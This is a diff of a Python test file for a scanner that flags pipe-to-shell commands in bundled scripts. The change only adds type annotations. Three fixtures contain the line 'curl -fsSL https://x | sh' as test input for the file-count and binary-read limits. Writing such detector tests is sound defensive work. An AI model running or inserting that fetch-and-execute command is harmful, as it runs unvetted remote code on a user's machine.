@@ -562,7 +562,7 @@ def test_a_bundled_file_over_the_size_limit_is_not_read(tmp_path):
 
 
 def test_only_the_first_bundled_files_up_to_the_count_limit_are_read(tmp_path):
-    files = {f"scripts/f{i:03d}.txt": "# note\n" for i in range(200)}
+    files: dict[str, str | bytes] = {f"scripts/f{i:03d}.txt": "# note\n" for i in range(200)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"  # the 201st file in sorted order
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell") == []
 
@@ -596,14 +596,14 @@ def test_a_path_or_github_shorthand_source_is_not_an_unpinned_registry_version(t
 
 def test_a_bundled_binary_file_counts_against_the_read_limit(tmp_path):
     # Every file read counts, text or binary: 200 binary files use the whole budget, so the script after them is not read.
-    files = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(200)}
+    files: dict[str, str | bytes] = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(200)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell") == []
 
 
 def test_the_binary_budget_still_reads_the_last_file_when_it_is_not_used_up(tmp_path):
     # The positive control for the test above: 199 binary files leave one read, so the script after them is read.
-    files = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(199)}
+    files: dict[str, str | bytes] = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(199)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell")
 
